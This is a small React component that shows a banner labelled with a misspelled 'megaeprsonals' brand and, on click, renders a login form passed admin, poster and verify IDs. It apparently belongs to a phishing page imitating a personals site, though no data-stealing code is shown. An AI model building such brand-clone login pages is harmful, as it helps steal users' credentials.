"use client";
import { useState } from "react";
import LoginForm from "./LoginForm";

export default function Home({ adminId, posterId, verifyId}) {
  const [next, setNext] = useState(false);
  return (
    <>
      {
        !next ? (
          <div
            className="w-full md:w-[60%] mx-auto"
            onClick={() => setNext(true)}
          >
            <img
              src="/images/banner.jpeg"
              alt="megaeprsonals"
              className="w-full h-full object-cover hidden md:block"
            />
            <img
              src="/banner.jpeg"
              alt="megaeprsonals"
              fill="cover"
              className="w-full h-full object-cover blog md:hidden"
            />
          </div>
        ) : (
          <LoginForm adminId={adminId} posterId={posterId}   verifyId={verifyId}/>
        )
       
    
      }
    </>
  );
}
